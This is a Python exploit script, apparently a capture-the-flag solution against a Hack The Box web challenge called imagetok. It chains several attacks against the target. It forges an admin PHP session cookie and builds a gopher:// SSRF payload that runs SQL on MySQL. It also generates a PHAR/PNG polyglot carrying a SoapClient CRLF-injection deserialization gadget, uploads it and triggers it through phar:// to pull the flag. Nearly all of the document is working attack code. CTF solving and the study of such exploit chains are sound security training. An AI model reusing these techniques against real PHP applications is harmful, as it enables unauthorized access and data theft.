#!/bin/python3
# v12
# ┌──(web㉿unk9vvn)-[~]
# └─$ sudo chmod +x exploit.py;sudo ./exploit.py
from urllib import parse
import requests
from tempfile import NamedTemporaryFile
import os
import base64, re
import argparse
from subprocess import Popen, DEVNULL, PIPE




RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
CYAN='\033[96m'
WHITE='\033[0m'


# Argparser
my_parser = argparse.ArgumentParser()
my_parser.add_argument('--host', type=str, required=True)
args = my_parser.parse_args()

URL = "http://"+ parse.urlparse(args.host).netloc
IMAGE = 'test.png'


def upload_file(file, session=requests.Session()):
    files = {"uploadFile": open(file, 'rb')}
    res = session.post(URL + '/upload', files=files, allow_redirects=False)
    loc = res.headers['Location']
    return loc.split('/')[-1].replace('\n', '').replace('\r', '')


def generate_session(username='admin'):
    session = requests.Session()

    for i in range(3):
        files = {"uploadFile": open(IMAGE, 'rb')}
        session.post(URL + '/upload', files=files)

    phpsessid = session.cookies.get_dict()['PHPSESSID']
    sign = phpsessid.split(".")[1]
    data = parse.unquote(phpsessid.split(".")[0])
    data = base64.b64decode(data)
    data = re.sub(r'"username":".+?"', f'"username":"{username}"', data.decode("ascii"))
    data = base64.b64encode(bytes(data, 'utf-8'))

    admin_session = data.decode("utf-8") + "." + sign
    res = requests.get(URL, cookies={'PHPSESSID': admin_session})
    admin_session = res.cookies.get_dict()["PHPSESSID"]
    return admin_session
    

def gopher_payload(result_user='admin'):
    res = requests.get(URL + '/info')
    tds = re.findall(r'<td class="v">(.*?)</td>', res.text)
    db_user = tds[426]
    db_name = tds[427]

    print(f'{GREEN}[!]{WHITE} db_user: {db_user}, db_name: {db_name}')

    mysql_query = f'INSERT INTO {db_name}.files(file_name, checksum, username) SELECT flag,"1","{result_user}" FROM {db_name}.definitely_not_a_flag;'
    print(f'{GREEN}[!]{WHITE} mysql_query: {mysql_query}')

    proc = Popen('/usr/local/bin/gopherus --exploit mysql', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    out, err = proc.communicate(input=f'{db_user}\n{mysql_query}\n'.encode())

    m = re.search(r'gopher\:\/\/127\.0\.0\.1\:3306\/\_(?:\%[0-9a-fA-F]{2})+', out.decode('ascii'))
    payload = m.group(0)
    
    return payload


def generate_phar(session, gohper_url):
    gohper_url = gohper_url.split('/_')
    gohper_url = gohper_url[0].replace('gopher://', 'gopher:///') + '/_' + parse.quote(gohper_url[1])
    
    php = f'''
    <?php
    class ImageModel
    {{
        public $file;
        public function __construct($file)
        {{
            $this->file = new SoapClient(null, array(
                "location" => "http://localhost:80/proxy",
                "uri" => "http://localhost:80/proxy",
                "user_agent" => "clrf-inject\\r\\n\\r\\n\\r\\n\\r\\n".
                    "POST /proxy HTTP/1.1\\r\\n".
                    "Host: admin.imagetok.htb\\r\\n".
                    "Connection: close\\r\\n".
                    "Cookie: PHPSESSID={session};\\r\\n".
                    "Content-Type: application/x-www-form-urlencoded\\r\\n".
                    "Content-Length: {str(len('url=' + gohper_url))}\\r\\n\\r\\n".
                    "url={gohper_url}".
                    "\\r\\n\\r\\n\\r\\n"
            ));
        }}
    }}
    @unlink('payload.phar');
    $phar = new Phar('payload.phar');
    $phar->startBuffering();
    $phar->addFile('{IMAGE}', '{IMAGE}');
    $phar->setStub(file_get_contents('{IMAGE}') . ' __HALT_COMPILER(); ?>');
    $phar->setMetadata(new ImageModel('none'));
    $phar->stopBuffering();
    system('mv payload.phar payload.png');
    '''

    with open('/tmp/imagetok-php.ini', 'w+') as ini:
        ini.write('[phar]\nphar.readonly = 0')

    with open('phar-generator.php', 'w+') as f:
        f.write(php)
        
    proc = Popen("php -c /tmp/imagetok-php.ini ./phar-generator.php", shell=True, stdin=DEVNULL, stdout=DEVNULL, stderr=DEVNULL)
    proc.communicate()



if __name__ == "__main__":
    # Generate admin session
    admin_session = generate_session()
    print(f'{GREEN}[!]{WHITE} admin_session: {admin_session}')

    # Generate gohper payload
    gohper_url = gopher_payload('flag')

    # Generate phar/png payload
    generate_phar(admin_session, gohper_url)

    # Upload phar/png payload file
    file_name = upload_file('payload.png')
    print(f'{GREEN}[!]{WHITE} Payload Uploaded: {file_name}')

    # Trigger phar
    session = requests.Session()
    session.get(f'{URL}/image/phar:%2f%2f{file_name}%2f{IMAGE}', cookies={'PHPSESSID': admin_session})
    
    # Get result from session cookie
    session = requests.Session()
    res = session.get(URL, cookies={'PHPSESSID': generate_session('flag')})
    result = res.cookies.get_dict()['PHPSESSID']
    result = parse.unquote(result.split('.')[0])
    result = base64.b64decode(result).decode('ascii')
    result = re.findall(r'HTB\{(.*?)\}"', result)[0]
    result = "HTB{"+result+"}"
    print(f'{GREEN}[+]{WHITE} result: {result}')
